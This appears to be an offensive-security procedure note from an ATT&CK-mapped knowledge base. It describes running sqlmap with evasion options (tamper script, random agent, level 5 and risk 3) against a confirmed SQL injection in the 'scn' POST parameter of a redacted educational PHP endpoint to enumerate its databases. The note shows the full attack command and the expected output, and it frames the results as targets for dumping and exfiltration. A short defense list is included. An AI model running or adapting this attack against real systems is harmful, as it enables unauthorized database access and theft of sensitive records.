---
id: proc-enumerate-dbs-001
tags:
  - sqli
  - enumeration
  - database
  - sqlmap
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-enumerate-databases]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:19.679Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Enumerate-Databases-with-sqlmap

## Summary

This procedure exploits a confirmed SQL injection to enumerate all accessible databases on the MySQL server, exposing schema information for further attacks like table dumping or data exfiltration.

## Description

Following vulnerability confirmation, attackers use sqlmap's --dbs option to query the MySQL database() function or information_schema via the injection point. In this case, the vulnerable scn parameter allows blind enumeration, revealing system databases (information_schema, mysql) and application-specific ones (LEAM, SET, testadmin). This step demonstrates impact, potentially leading to sensitive data access in educational or administrative databases.

## Requirements

1. Prior confirmation of SQL injection (from detection procedure)
2. sqlmap session continuity or repeated targeting
3. Stable network to the endpoint to avoid rate-limiting

## Defense

Defensive measures and detection strategies:

- Restrict database user privileges to least necessary (e.g., no SHOW DATABASES access)
- Use database firewalls or proxies to limit enumeration queries
- Monitor application logs for repeated failed queries or unusual delays (time-based indicators)
- Regular vulnerability scanning and patching of PHP/MySQL stacks

## Objectives

1. List all databases accessible via the injection
2. Identify custom databases for targeted exploitation
3. Quantify the scope of compromise

## Instructions

### Step 1: Execute Database Enumeration

**Context**: Append --dbs to the sqlmap command, reusing the vulnerable POST payload to extract database names through the confirmed injection technique.

**Command** ([[commands/sqlmap-enumerate-databases]]):
```bash
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent -u https://████/olc/set/m101/leasib.php --data="COURSEID=M101&SUBJECT=Entry%20Briefing&StudentName=dPbRKJwr&Submit=Submit%20Confirmation&scn=0" -p scn --dbs
```

> sqlmap injects payloads to enumerate via UNION or blind methods. Expected output: A numbered list of databases, e.g., [13]: information_schema, mysql, performance_schema, LEAM, SET, testadmin, confirming unauthorized access.

### Step 2: Analyze Enumerated Databases

**Context**: Review the output to prioritize targets for deeper exploitation, such as dumping tables from LEAM or SET.

**Command**: No additional; parse sqlmap output.

> Look for custom names indicating application data. Success: Exposure of 13 databases, highlighting full backend compromise potential.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-enumerate-databases]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- sqli
- enumeration
- mysql
